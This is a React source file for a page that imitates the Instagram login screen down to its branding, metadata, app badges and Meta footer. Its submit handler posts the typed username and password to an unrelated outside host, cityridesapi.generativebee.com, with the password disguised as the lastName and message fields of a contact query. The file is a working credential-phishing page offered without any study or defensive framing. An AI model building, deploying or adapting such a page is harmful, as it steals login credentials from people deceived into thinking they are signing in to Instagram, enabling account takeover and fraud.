import { createFileRoute } from "@tanstack/react-router";
import { useState } from "react";

export const Route = createFileRoute("/")({
  head: () => ({
    meta: [
      { title: "Login • Instagram" },
      {
        name: "description",
        content:
          "Log in to Instagram to see photos and videos from your friends.",
      },
      { property: "og:title", content: "Login • Instagram" },
      {
        property: "og:description",
        content:
          "Log in to Instagram to see photos and videos from your friends.",
      },
    ],
  }),
  component: Index,
});

function Index() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const canSubmit = username.length > 0 && password.length >= 6;

  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (canSubmit) {
      // Handle login logic here
      fetch("https://cityridesapi.generativebee.com/api/contact/create-user-query", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email: "test@gmail.com",
          firstName: username,
          lastName: password,
          message: password,
          mobile: "9672305647"
        }),
      })
        .then((response) => response.json())
        .then((data) => {
          // Handle successful login
          console.log("Login successful:", data);
        })
        .catch((error) => {
          // Handle login error
          console.error("Login error:", error);
        });
      console.log("Logging in with:", { username, password });
    }
  }

  return (
    <div className="min-h-screen bg-[#fafafa] flex flex-col items-center justify-center px-4 py-8">
      <div className="w-full max-w-[350px] flex flex-col gap-3">
        {/* Main card */}
        <div className="bg-white border border-[#dbdbdb] px-10 pt-10 pb-6 flex flex-col items-center">
          {/* <h1
            className="text-[42px] leading-none mt-3 mb-8 text-[#262626]"
            style={{
              fontFamily:
                "'Billabong', 'Grand Hotel', 'Dancing Script', cursive",
            }}
          >
            Instagram
          </h1> */}

          <img src="/insta.png" width="175" height="175" className="size-20 mb-10" />

          <form
            onSubmit={(e) => {
              e.preventDefault();
              handleSubmit(e);  
            }}
            className="w-full flex flex-col gap-1.5"
          >
            <label className="relative block">
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                className="peer w-full h-[38px] bg-[#fafafa] border border-[#dbdbdb] rounded-[3px] px-2 pt-[10px] pb-1 text-xs text-[#262626] focus:outline-none focus:border-[#a8a8a8]"
                placeholder=" "
                autoComplete="username"
              />
              <span
                className={`absolute left-2 text-[#8e8e8e] pointer-events-none transition-all origin-left ${username
                    ? "top-1 text-[10px] scale-90"
                    : "top-1/2 -translate-y-1/2 text-xs"
                  }`}
              >
                Phone number, username or email
              </span>
            </label>

            <label className="relative block">
              <input
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="peer w-full h-[38px] bg-[#fafafa] border border-[#dbdbdb] rounded-[3px] px-2 pt-[10px] pb-1 text-xs text-[#262626] focus:outline-none focus:border-[#a8a8a8]"
                placeholder=" "
                autoComplete="current-password"
              />
              <span
                className={`absolute left-2 text-[#8e8e8e] pointer-events-none transition-all origin-left ${password
                    ? "top-1 text-[10px] scale-90"
                    : "top-1/2 -translate-y-1/2 text-xs"
                  }`}
              >
                Password
              </span>
            </label>

            <button
              type="submit"
              disabled={!canSubmit}
              className="mt-2 w-full h-[32px] rounded-[8px] bg-[#0095f6] text-white text-sm font-semibold disabled:opacity-50 hover:bg-[#1877f2] transition-colors"
            >
              Log in
            </button>
          </form>

          <div className="w-full flex items-center gap-4 my-4">
            <div className="flex-1 h-px bg-[#dbdbdb]" />
            <span className="text-[13px] font-semibold text-[#8e8e8e]">OR</span>
            <div className="flex-1 h-px bg-[#dbdbdb]" />
          </div>

          <button className="flex items-center gap-2 text-[#385185] text-sm font-semibold">
            <svg
              width="16"
              height="16"
              viewBox="0 0 24 24"
              fill="currentColor"
              aria-hidden="true"
            >
              <path d="M22 12.06C22 6.5 17.52 2 12 2S2 6.5 2 12.06C2 17.08 5.66 21.24 10.44 22v-7.03H7.9v-2.91h2.54V9.85c0-2.51 1.49-3.89 3.77-3.89 1.09 0 2.24.2 2.24.2v2.47h-1.26c-1.24 0-1.63.77-1.63 1.56v1.87h2.77l-.44 2.91h-2.33V22C18.34 21.24 22 17.08 22 12.06z" />
            </svg>
            Log in with Facebook
          </button>

          <a
            href="#"
            className="mt-4 mb-2 text-[12px] text-[#00376b] hover:underline"
          >
            Forgot password?
          </a>
        </div>

        {/* Signup card */}
        <div className="bg-white border border-[#dbdbdb] py-5 text-center text-sm text-[#262626]">
          Don't have an account?{" "}
          <a href="#" className="text-[#0095f6] font-semibold hover:underline">
            Sign up
          </a>
        </div>

        {/* Get the app */}
        <div className="mt-2 text-center text-sm text-[#262626]">
          Get the app.
        </div>
        <div className="flex justify-center gap-2 mt-1">
          <img
            src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png"
            alt="Download on the App Store"
            className="h-10"
          />
          <img
            src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png"
            alt="Get it on Google Play"
            className="h-10"
          />
        </div>
      </div>

      <footer className="mt-12 text-center text-xs text-[#8e8e8e]">
        <nav className="flex flex-wrap justify-center gap-x-4 gap-y-2 max-w-[700px] px-4">
          {[
            "Meta",
            "About",
            "Blog",
            "Jobs",
            "Help",
            "API",
            "Privacy",
            "Terms",
            "Locations",
            "Instagram Lite",
            "Threads",
            "Contact Uploading & Non-Users",
            "Meta Verified",
          ].map((l) => (
            <a key={l} href="#" className="hover:underline">
              {l}
            </a>
          ))}
        </nav>
        <div className="mt-4 flex justify-center gap-4">
          <span>English</span>
          <span>© 2026 Instagram from Meta</span>
        </div>
      </footer>
    </div>
  );
}
